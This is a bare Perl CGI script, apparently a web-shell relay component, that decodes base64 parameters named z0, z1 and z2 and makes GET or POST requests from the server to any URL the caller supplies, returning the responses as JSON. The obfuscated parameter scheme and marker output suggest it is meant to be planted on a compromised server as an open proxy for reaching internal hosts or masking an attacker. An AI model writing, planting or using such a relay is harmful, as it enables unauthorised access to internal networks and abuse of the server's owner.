use strict;
use warnings;
use CGI;
use MIME::Base64;
use JSON;
use LWP::UserAgent;
use HTTP::Request;

sub main {
    my $q = CGI->new;
    print "1";
    my $z0 = $q->param('z0') // '';
    my $action = decode_base64($z0);
    $action =~ s/^\s+|\s+$//g;

    my %result = (
        status    => 'error',
        action    => $action,
        http_code => undef,
        data      => undef
    );

    my $ua = LWP::UserAgent->new;
$ua->timeout(5);
$ua->agent("Mozilla/5.0");

    if ($action eq 'get') {

    my $url = decode_base64($q->param('z1') // '');

    if (!$url || $url eq '') {
        $result{data} = 'Missing URL';
    }
    else {

        my $response = $ua->get($url);

        $result{http_code} = $response->code;

        if ($response->is_success) {
            $result{status} = 'ok';
        }
        else {
            $result{status} = 'http_error';
        }

        $result{data} = substr($response->content, 0, 1000);
    }
}
    elsif ($action eq 'post') {

        my $url  = decode_base64($q->param('z1') // '');
        my $data = decode_base64($q->param('z2') // '');

        if (!$url || $url eq '') {
            $result{data} = 'Missing URL';
        }
        else {
            my $req = HTTP::Request->new(POST => $url);
            $req->header('Content-Type' => 'application/x-www-form-urlencoded');
            $req->content($data);

            my $response = $ua->request($req);

            $result{status}    = 'ok';
            $result{http_code} = $response->code;
            $result{data}      = $response->decoded_content;
        }

    }
    else {
        $result{data} = 'Invalid action';
    }

    my $json = JSON->new->utf8->canonical(1);
    print $json->encode(\%result);
}

main();